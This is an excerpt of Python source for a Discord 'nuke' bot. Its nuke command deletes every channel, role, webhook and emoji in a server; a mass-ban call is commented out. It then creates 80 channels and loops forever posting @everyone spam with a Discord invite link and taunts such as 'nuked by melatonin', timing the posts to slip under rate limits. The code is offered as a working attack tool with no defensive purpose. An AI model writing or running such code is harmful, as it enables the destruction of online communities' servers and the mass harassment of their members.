...
def setUp():
    ...
    print('Join our discord https://discord.gg/r9RzKgUZZS')
...
MESSAGES = ["@everyone nuked by melatonin", "https://discord.gg/r9RzKgUZZS", "@everyone RIP", "@everyone https://discord.gg/r9RzKgUZZS", "@everyone https://discord.gg/r9RzKgUZZS","https://discord.gg/r9RzKgUZZS", "@everyone fucked | https://discord.gg/r9RzKgUZZS", "@everyone", "@here", "https://discord.gg/r9RzKgUZZS" ]
...
async def nuke(ctx):
    ...
    # Delete everything as before, except banning users
    tasks = [
        deleteAllChannels(ctx), 
        deleteAllRoles(ctx), 
        # banAll(ctx),  # This line is commented out to remove the ban functionality
        deleteAllWebhooks(ctx), 
        deleteAllEmojis(ctx)
    ]
    await asyncio.gather(*tasks)

    # Create new channels and spam "nuked"
    await createAndSpamChannels(ctx)
...
async def createAndSpamChannels(ctx):
    tasks = []
    for i in range(80):  # Number of channels to create
        task = createChannelAndSpam(ctx, i)
        tasks.append(task)
        if len(tasks) >= MAX_CONCURRENT_REQUESTS:
            await asyncio.gather(*tasks)
            tasks = []
            await asyncio.sleep(RATE_LIMIT_DELAY)  # Short delay between batches
    ...
    try:
        ...
        while True:
            for message in MESSAGES:
                ...
                await asyncio.sleep(RATE_LIMIT_DELAY)  # Short delay to avoid hitting rate limits
